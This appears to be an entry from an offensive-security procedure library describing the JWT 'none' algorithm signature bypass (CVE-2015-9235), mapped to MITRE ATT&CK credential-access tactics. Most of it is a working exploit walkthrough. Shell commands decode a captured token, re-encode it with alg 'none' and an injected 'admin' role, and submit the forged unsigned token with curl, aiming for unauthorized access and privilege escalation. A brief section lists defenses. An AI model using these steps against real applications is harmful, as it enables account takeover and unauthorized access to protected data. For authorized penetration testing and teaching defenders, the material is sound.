---
id: deab8dfc-20ce-431b-9d48-d6f1d488f488
name: JWT-None-Algorithm-Signature-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:00.592746+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
sub_techniques: []
tags:
  - '[[tags/JWT - JSON Web Token]]'
  - '[[tags/JWT Signature]]'
  - '[[tags/JWT Signature - None Algorithm (CVE-2015-9235)]]'
  - jwt
  - auth-bypass
  - cve-2015-9235
commands:
  - '[[commands/base64-decode-jwt-parts]]'
  - '[[commands/base64-encode-jwt-header]]'
  - '[[commands/curl-send-tampered-jwt]]'
platforms:
  - Web
tools:
  - '[[tools/jwt_tool]]'
  - '[[tools/Burp-Suite]]'
validated: true
---

# JWT-None-Algorithm-Signature-Bypass

## Summary

This procedure exploits the JWT 'none' algorithm vulnerability (CVE-2015-9235) by modifying a captured JWT token's header to use the 'none' algorithm, effectively bypassing digital signature verification. This allows an attacker to forge claims and gain unauthorized access to protected resources in web applications that fail to properly validate the algorithm.

## Description

JSON Web Tokens (JWTs) are commonly used for authentication and authorization in web applications. A JWT consists of three Base64Url-encoded parts: header, payload, and signature, separated by dots (e.g., header.payload.signature). The header specifies the signing algorithm, such as 'HS256' or 'RS256'. The 'none' algorithm indicates no signature is required, but many implementations do not enforce rejection of this value, allowing attackers to tamper with the token. By decoding the header, changing 'alg' to 'none', re-encoding it, and omitting the signature, the tampered token can be submitted to the application. This is particularly effective against APIs or single-page applications (SPAs) that rely on JWTs for session management. The attack assumes the application accepts 'none' without checking and does not validate the token's integrity beyond the signature presence.

## Requirements

1. Valid JWT token obtained from the target application (e.g., via login or interception).
2. Access to a tool or environment for Base64Url encoding/decoding (e.g., Python, online decoder, or Burp Suite).
3. Network access to the target application's API endpoints that accept the JWT.
4. Knowledge of the target's JWT structure and any custom claims required for privilege escalation.

## Defense

- Always reject JWTs with 'alg' set to 'none' and enforce a strict allowlist of permitted algorithms.
- Implement server-side validation to ensure the algorithm matches the expected one and verify signatures using the correct public key or secret.
- Use libraries that handle JWT validation securely (e.g., avoid manual parsing) and monitor for anomalous token usage patterns, such as frequent signature failures or unexpected 'none' attempts.
- Rotate signing keys regularly and implement token expiration with short lifetimes.

## Objectives

1. Bypass JWT signature verification to forge authentication or authorization claims.
2. Gain unauthorized access to user accounts, admin functions, or sensitive data.
3. Escalate privileges by modifying payload claims like 'role' or 'admin' to true.

## Instructions

### Step 1: Capture and Decode the Original JWT

**Context**: Obtain a legitimate JWT from the application, typically via browser developer tools, proxy interception, or API response. Decode the header and payload to understand the structure without altering the signature yet. This step confirms the token's format and identifies modifiable claims.

**Command** ([[commands/base64-decode-jwt-parts]]):
```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | cut -d'.' -f1 | base64 -d 2>/dev/null
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | cut -d'.' -f2 | base64 -d 2>/dev/null
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | cut -d'.' -f3 | base64 -d 2>/dev/null
```

> This command splits the JWT by dots and decodes each part using base64. The header will show something like {"alg":"HS256","typ":"JWT"}, the payload {"sub":"1234567890","name":"John Doe","iat":1516239022}, and the signature as binary data. Verify the payload claims you intend to modify, such as changing 'role' from 'user' to 'admin' if present.

### Step 2: Modify and Re-encode the Header and Payload

**Context**: Edit the decoded header to set 'alg' to 'none' and adjust payload claims for desired privileges (e.g., elevate user role). Re-encode both parts using Base64Url (no padding). This creates the tampered token without a signature, exploiting the vulnerability.

**Command** ([[commands/base64-encode-jwt-header]]):
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"sub":"1234567890","name":"John Doe","role":"admin","iat":1516239022}' | base64 | tr -d '=' | tr '/+' '_-'
```

> Encode the modified header and payload. Output will be strings like 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0' for header and 'eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ' for payload. If the original payload lacks a modifiable claim, add one that the application recognizes. Decision point: If the app uses RS256, also test swapping to HS256 with a weak secret, but focus on 'none' here.

### Step 3: Construct and Submit the Tampered JWT

**Context**: Combine the encoded header and payload with a dot separator and no signature (or empty after second dot). Submit via API request to test acceptance. Use a proxy like Burp Suite to intercept and modify if needed.

**Command** ([[commands/curl-send-tampered-jwt]]):
```bash
curl -X GET "https://target-api.com/protected-resource" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ." -v
```

> The tampered token is header.payload. (note the trailing dot). Expected success: HTTP 200 with protected data or admin features accessible. If rejected, check for strict validation or try without the trailing dot. Verify by accessing a resource requiring elevated privileges.
